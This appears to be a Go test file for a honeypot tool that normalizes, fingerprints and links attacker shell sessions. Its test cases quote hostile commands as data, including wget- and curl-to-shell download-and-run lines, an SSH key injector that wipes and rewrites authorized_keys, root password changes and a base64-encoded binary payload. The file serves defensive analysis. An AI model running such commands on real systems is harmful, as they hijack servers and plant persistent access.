package script

import (
	"reflect"
	"strings"
	"testing"
)

func norm(s string) string { return strings.Join(NormalizeCommand(s), " ") }

func TestNormalizeCommandGolden(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{`uname -s -v -n -r -m`, `uname -s -v -n -r -m`},
		{`cd /tmp; wget http://1.2.3.4/x.sh; sh x.sh`, `cd /tmp ; wget <url> ; sh x.sh`},
		{`echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQC/47d8xbCuUjYsBrxtmLjL4FDUe3BPIemNktjPY mdrfckr" >> .ssh/authorized_keys`,
			`echo "ssh-rsa <key> mdrfckr" >> .ssh/authorized_keys`},
		{`echo "root\ndp75z0biqzBE\ndp75z0biqzBE" | passwd`, `echo "root\n<tok>\n<tok>" | passwd`},
		{`echo 'vT'`, `echo <tok>`},
		{`curl -s 10.0.0.9:8080/a|bash`, `curl -s <ip> | bash`},
		{`chmod 777 /tmp/kxhqwe; /tmp/kxhqwe`, `chmod <n> /tmp/<f> ; /tmp/<f>`},
		{`echo deadbeefdeadbeefdeadbeef`, `echo <hex>`},
		// From the review's executed probes:
		{`uname -a 2>&1; whoami >/dev/null 2>&1`, `uname -a 2>&1 ; whoami > /dev/null 2>&1`},
		{`base64 -d x | python3 -`, `base64 -d x | python3 -`},
		{`echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKBT1fubDzcjP8Ntf33MZwaTgCpwTQRaj7IrSvXO0lBU k"`, `echo "ssh-ed25519 <key> k"`},
		{"echo a\nwhoami", `echo a ; whoami`},
	} {
		if got := norm(tc.in); got != tc.want {
			t.Errorf("NormalizeCommand(%q)\n got %q\nwant %q", tc.in, got, tc.want)
		}
	}
	if got := norm(`echo "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | base64 -d > x`); strings.Contains(got, "<key>") {
		t.Errorf("base64 payload mistaken for a key: %q", got)
	}
}

func TestEncodingRoundTripsQuotedTokens(t *testing.T) {
	lines := []string{EncodeLine(`echo "a ; b | c" ; uname`), EncodeLine("id")}
	got := Split(Join(lines))
	want := [][]string{NormalizeCommand(`echo "a ; b | c" ; uname`), NormalizeCommand("id")}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("round trip:\n got %q\nwant %q", got, want)
	}
	if n := CommandCount(got); n != 3 {
		t.Fatalf("CommandCount = %d, want 3 (quoted separators are not commands)", n)
	}
	if strings.ContainsAny(EncodeLine("a\x1fb\x1ec"), "\x1e") || len(Split(EncodeLine("a\x1fb\x1ec"))[0]) != 3 {
		t.Fatal("separator bytes from attacker input must be stripped")
	}
}

func TestFingerprintIgnoresPerVictimRandomness(t *testing.T) {
	a := Join([]string{EncodeLine(`echo "root\nAbc123xyz789\nAbc123xyz789" | passwd`)})
	b := Join([]string{EncodeLine(`echo "root\nQwe987rty654\nQwe987rty654" | passwd`)})
	if Fingerprint(a) != Fingerprint(b) {
		t.Fatal("random passwords changed the fingerprint")
	}
}

func TestDistinctiveRule(t *testing.T) {
	cmds := func(ss ...string) [][]string {
		var out [][]string
		for _, s := range ss {
			out = append(out, NormalizeCommand(s))
		}
		return out
	}
	if Distinctive(cmds("uname -a 2>&1", "whoami >/dev/null 2>&1", "id", "uptime", "w")) {
		t.Error("recon plus redirections must not be distinctive")
	}
	if Distinctive(cmds(`c1=$(uname -s); c2=$(grep "model name" /proc/cpuinfo | head -n1); cat /etc/issue | wc -l; crontab -l; awk '{print $1}' /proc/loadavg`)) {
		t.Error("Outlaw-style recon must not be distinctive")
	}
	if Distinctive(cmds(`cd /tmp; wget http://x/y; sh y`)) {
		t.Error("fewer than 5 commands must not be distinctive")
	}
	if !Distinctive(cmds(`cd ~; chattr -ia .ssh; lockr -ia .ssh; rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQC/47d8xbCuUjYsBrxtmLjL4FDUe3BPIemNktjPY x" >> .ssh/authorized_keys`)) {
		t.Error("the key injector must be distinctive")
	}
}

func TestLinkDecisionAndCommon(t *testing.T) {
	for _, tc := range []struct {
		distinctive        bool
		actors, population int
		links              bool
		reason             string
	}{
		{false, 2, 3000, false, "not distinctive: fewer than 5 commands or recon only"},
		{true, 2, 3000, true, "distinctive, used by 2 actors"},
		{true, 26, 100000, false, "common: used by 26 actors"},
		{true, 5, 100, false, "common: used by 5.0% of actors"},
		{true, 3, 50, true, "distinctive, used by 3 actors"}, // small honeypot: 6% but < 5 actors
	} {
		links, reason := LinkDecision(tc.distinctive, tc.actors, tc.population)
		if links != tc.links || reason != tc.reason {
			t.Errorf("LinkDecision(%v,%d,%d) = %v %q", tc.distinctive, tc.actors, tc.population, links, reason)
		}
	}
}

func FuzzNormalizeCommand(f *testing.F) {
	for _, s := range []string{`uname -a`, `echo "a\nb" | passwd`, `cd /tmp;wget http://x/y&&sh y`, "\x00\xff'\"\x1e\x1f", "2>&1 &>>x"} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		line := EncodeLine(s)
		enc := Join([]string{line})
		if line != "" && !reflect.DeepEqual(Split(enc), [][]string{NormalizeCommand(s)}) {
			t.Fatalf("round trip broke for %q", s)
		}
		_ = Fingerprint(enc)
		_ = Distinctive(Split(enc))
		_ = Display(enc, 2048)
		_ = ExtractKeys(s)
	})
}

func TestHeredocAndWrappers(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{"cat <<EOF\nid\nw\nuptime\nEOF", `cat << <heredoc>`},
		{"cat <<'X' > /tmp/a\nfoo\nX\nwhoami", `cat << <heredoc> > /tmp/<f> ; whoami`},
		{`nohup python3 x`, `nohup python3 x`},
		{`sudo base64 -d f`, `sudo base64 -d f`},
		{`x=1 md5sum f`, `x=1 md5sum f`},
	} {
		if got := norm(tc.in); got != tc.want {
			t.Errorf("NormalizeCommand(%q)\n got %q\nwant %q", tc.in, got, tc.want)
		}
	}
	if Distinctive([][]string{NormalizeCommand("cat <<EOF\nid\nw\nuptime\nEOF")}) {
		t.Error("a heredoc body must not count as commands")
	}
	if n := CommandCount([][]string{NormalizeCommand("sudo wget http://x/y; nohup sh y; env A=1 id; busybox wget z; time ls")}); n != 5 {
		t.Errorf("CommandCount = %d, want 5", n)
	}
	if !Distinctive([][]string{NormalizeCommand("sudo wget http://x/y; nohup ./y; id; w; ls")}) {
		t.Error("wget behind sudo must count as a non-recon program")
	}
}
